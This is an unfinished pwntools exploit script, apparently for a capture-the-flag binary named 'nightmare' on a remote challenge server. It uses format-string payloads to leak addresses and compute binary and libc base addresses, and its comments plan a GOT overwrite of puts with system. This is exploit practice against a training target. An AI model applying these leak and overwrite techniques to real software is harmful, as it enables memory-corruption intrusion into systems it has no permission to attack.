from pwn import *

context.arch = 'amd64'

# p = process('./nightmare')
p = remote('46.101.91.21', 32106)

elf = ELF('./nightmare')
libc = ELF('./libc.self')

# OFFSET_LEAK = 0x14c9
# OFFSET_PRINTF_BASE_LEAK_INDEX = 41
# OFFSET_PRINTF_BUF_ADDR = 4

#note: i'm not going to be able to use the "scream into the void" printf to leak anything because it writes to stderr
#so i need to use the "try to escape" functionality to leak things
# print(p.recv())
# p.sendline('1')
# print(p.recv())
# p.sendline('AAAAAAAA' + '%p ' * 50)
# leaks = p.recv(timeout=0.1)
# print(leaks)
# binary_base = int(leaks.decode('latin-1').split(' ')[OFFSET_PRINTF_BASE_LEAK_INDEX], 16) - OFFSET_LEAK
# print(f"Got binary base address: {hex(binary_base)}")

# procmaps = p.libs()
# for i in procmaps:
#     print(f"{i} : {hex(procmaps[i])}")

OFFSET_LEAK = 0x2079

#leak offset from "try to escape" part
print(p.recv())
p.sendline('2')
print(p.recv())
p.sendline('%p')
leak_data = p.recv()
leak_addy = int(leak_data.decode('latin-1').split('\n\nWrong')[0], 16)
print(f"Leaked address: {hex(leak_addy)}")
binary_base = leak_addy - OFFSET_LEAK
print(f"Binary base: {hex(binary_base)}")

elf.address = binary_base
GOT_PUTS = elf.got['puts']
print(f"GOT_PUTS: {hex(GOT_PUTS)}")

# offset_stderr = binary_base + 0x00003600
# gdb.attach(p, gdbscript=f"x/x {hex(offset_stderr)}")

def leak_offset(offset):
    p.recv(timeout=0.5)
    p.sendline('2')
    prompt = p.recv(timeout=0.5)
    # print(prompt)
    payload = f"%{offset}$p"
    # print(payload)
    p.sendline(payload.encode('latin-1'))
    data = p.recv(timeout=0.1)
    # print(data)
    leak = data.decode('latin-1').split('\nWrong')[0].rstrip()
    p.sendline('')
    p.sendline('')
    p.sendline('')
    p.sendline('')
    p.sendline('')
    p.recv(timeout=0.1)
    if leak == '(nil)':
        return 0
    else:
        return int(leak, 16)

# looking_libc = p.libs()['/usr/lib/x86_64-linux-gnu/libc-2.31.so']

# for o in range(10,89):
#     leak = leak_offset(o)
#     ofs = leak - looking_libc
#     print(f"Leak {o}: {hex(leak)}  {ofs}  {hex(ofs)}")

# gdb.attach(p)

offset_libc_start_main_ret = leak_offset(13)
offset_from_base = 0x26d0a # specific to this machine: need to change this
libc_base = offset_libc_start_main_ret - offset_from_base
print(f"Offset __libc_start_main_ret found: {hex(offset_libc_start_main_ret)}")
# this leaked address can be used to correctly identify the libc binary using https://libc.blukat.me
# value returned from server: Offset __libc_start_main_ret found: 0x7f33d14830b3
# there are 3 results found so we should just iterate through all of them i guess
print(f"Libc base: {hex(libc_base)}")

# gdb.attach(p, gdbscript=f"x/x {hex(offset)}")
# init_cacheinfo = offset - 287
# print(f"init_cacheinfo: {hex(init_cacheinfo)}")
#offset is this:
#0x7ff5484e67cf <init_cacheinfo+287>:    0x48c58948


##needs to be fixed for STDIN issue
##try to leak puts address from GOT
# p.sendline('1')
# print(p.recv())
# payload = (('%p ' * 7)+'%s ').encode('latin-1')
# payload += p64(GOT_PUTS)
# p.sendline(payload)
# result = p.recv(timeout=0.1)
# print(result)
# segments = result.decode('latin-1').split('What')[0]
# resulttext = segments.split(' ')[7]
# puts_leak = int.from_bytes(resulttext.encode('latin-1'), 'little')
# print(f"Got address of PUTS: {hex(puts_leak)}")

# libc_base = puts_leak - libc.sym['puts']
# print(f"Libc base: {hex(libc_base)}")
# libc.address = libc_base

#now we have libc and puts addresses, we can replace puts with system (maybe)

# gdb.attach(p)
# junk = ' '.join(segments.split(' ')[:7]) + ' '
# resulttext = segments[len(junk):]


def send_printf(payload):
    p.sendline('1')
    p.recv()
    print(payload)
    p.sendline(payload)
    output = p.recv()
    print(output)
    return output

# fmt = FmtStr(send_printf)


# gdb.attach(p)
#the 5th element refers to the beginning of the printf text



